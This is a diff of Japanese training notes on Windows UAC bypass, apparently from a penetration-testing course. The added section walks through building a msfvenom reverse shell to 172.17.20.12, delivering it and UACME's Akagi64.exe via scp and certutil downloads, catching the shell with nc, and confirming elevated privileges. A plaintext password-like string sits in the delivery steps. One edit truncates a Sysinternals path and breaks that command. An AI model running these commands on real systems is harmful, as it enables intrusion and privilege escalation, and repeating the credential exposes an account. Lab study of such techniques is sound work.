@@ -11,7 +11,7 @@
 * アプリケーションマニフェスト（プログラム起動時にOSがそのプログラムをどのように処理するかを示す情報を含む XML ファイル）の検査をする
 
   ```cmd
-  cd C:\Tools\privilege_escalation\SysinternalsSuite
+  cd C:\Tools\privilege_escalation\Sysintern
   sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
   ```
 
@@ -99,3 +99,60 @@
   
   
 
+### UACME
+
+https://github.com/hfiref0x/UACME
+
+3. UACMeのリポジトリをクーロンする
+     * ※masterブランチではなく、v3.2.xのブランチを使用すること
+
+       ![image-20230114124559887](img/UACByPass/image-20230114124559887.png)
+       
+     * ※Akagi64.exeのコンパイル時はvisual studioのバージョンにあったSDKをプロパティから設定すること
+     
+       ![image-20230114124611192](img/UACByPass/image-20230114124611192.png)
+     
+  4. UAC bypass用のリバースシェルを作成する
+
+     ```plaintext
+     msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.17.20.12 LPORT=10010 -f exe > rev_10010_iga.exe
+     ```
+     
+  5. Akagi64.exeとリバースシェルを配送する
+
+     ```plaintext
+     # kali
+     /home/kali/Documents/tuikakensyu
+     scp Akagi64.exe  test-student2@172.17.20.12:~/C2Server/igarashi/
+     JwErS2wBLpnSr2G6RYR7Gvb9aWMechni
+     
+     # ws01
+     certutil -urlcache -split -f "http://172.17.20.12:10018/Akagi64.exe" C:\tmp\igarashi\Akagi64.exe
+     ```
+
+     ```plaintext
+     # kali
+     scp rev_10010_iga.exe test-student2@172.17.20.12:~/C2Server/igarashi/
+     JwErS2wBLpnSr2G6RYR7Gvb9aWMechni
+     
+     # ws01
+     certutil -urlcache -split -f "http://172.17.20.12:10018/rev_10010.exe" C:\tmp\igarashi\rev_10010_iga.exe
+     ```
+     
+  6. UACMeを実行する
+
+     ```plaintext
+     # C2Server
+     nc -lvnp 10010
+     C:\Users\makise\AppData\Roaming>Akagi64_iga.exe 33 C:\Users\makise\AppData\Roaming\rev_10010_iga.exe
+     ```
+     
+  7. 権限昇格できたことを確認する
+
+     ```plaintext
+     whoami /all
+     ```
+     * Mandatory LabelがHighになっていること
+
+     * sedebugprivilegeがついていること
+     
